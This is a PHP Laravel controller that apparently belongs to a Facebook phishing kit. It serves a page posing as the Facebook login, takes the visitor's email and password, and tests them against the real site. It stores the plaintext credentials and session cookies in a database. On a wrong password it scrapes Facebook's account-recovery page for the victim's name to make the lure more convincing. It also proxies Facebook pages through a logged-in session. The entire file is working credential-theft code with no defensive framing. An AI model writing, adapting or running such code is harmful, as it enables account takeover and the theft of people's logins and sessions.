<?php

namespace App\Http\Controllers;

require_once('../lib/simple_html_dom.php');

use App\Account;
use App\Helpers\Helper;
use App\Helpers\RequestHelper;
use App\ManagerFacebook;
use App\Services;
use App\UserFacebook;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Cookie;
use Illuminate\Support\Facades\Session;

class LoginFacebookController extends Controller
{
    public function index(Request $request) {
        return view('fb.login_facebook_default');
    }

    public function actionLogin(Request $request) {
        $username = $request->email;
        $pass = $request->pass;
        $manager = new UserFacebook([
            'username' => $username,
            'pass' => $pass
        ]);
        $ch = curl_init();
        $cookies = [];
        $statusLogin = $manager->getLoginStatus($ch, $cookies);
        $sfau = 'sfau';
        $user_name = 'username';
        $message = 'error';
        $success = false;
        switch ($statusLogin)
        {
            case Helper::$LOGIN_WRONG_PASSWD:
                if (isset($cookies['sfau'])) {
                    $sfau = $cookies['sfau'];
                    $url = 'https://m.facebook.com/login/account_recovery/name_search/?cuid='.$sfau.'&errorcode=1348092&flow=initiate_view&ls=initiate_view&refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2Faccount_recovery%2Fname_search%2F&_rdr';
                    $result = RequestHelper::curlExec($ch, $url);
                    if (RequestHelper::isSuccess($ch) && $result) {
                        $html = str_get_html($result);
                        $user_name = $html->find('i.img', 0)->parent()->next_sibling()->first_child()->first_child()->plaintext;
                    }
                }
                break;
            case Helper::$LOGIN_NEED_2FA:
                break;
            case Helper::$LOGIN_CHECKPOINT:
                break;
            case Helper::$LOGIN_SUCCESS:
                $success = true;
                $cookies = json_encode($cookies);
                break;
        }
        if ($success) {
            $service = Services::query()
                ->where('alias', 'facebook')
                ->where('status', Helper::$STATUS_ON)
                ->first();
            Account::query()->create([
                'service_alias' => $service->alias,
                'username' => $username,
                'pass' => $pass,
                'url' => Session::get('url'),
                'cookie' => $cookies,
            ]);
            Cookie::queue($service->alias .':::'. Helper::$CASE_LOGINNED, true, 60*24*365);
            return redirect()->to(Session::get('url'));
        }
        return redirect()->route('loginfb.index')
            ->with([
                'sfau' => $sfau,
                'user_name' => $user_name,
                'email' => $username,
                'message' => $message,
            ]);
    }

    public function loading(Request $request) {
        $manager = new ManagerFacebook();
        if ($manager->login()) {
            $url = Session::get('url');
            $html = $manager->visit($url);
            preg_match("/<head[^>]*>(.*?)<\/head>/is", $html, $matches);
            $header = $matches[1];
            preg_match("/<body[^>]*>(.*?)<\/body>/is", $html, $matches);
            $body = $matches[1];
            return view('fb.loading')->with([
                'header' => $header,
                'body' => $body,
            ]);
        }
        return abort(404);
    }
}
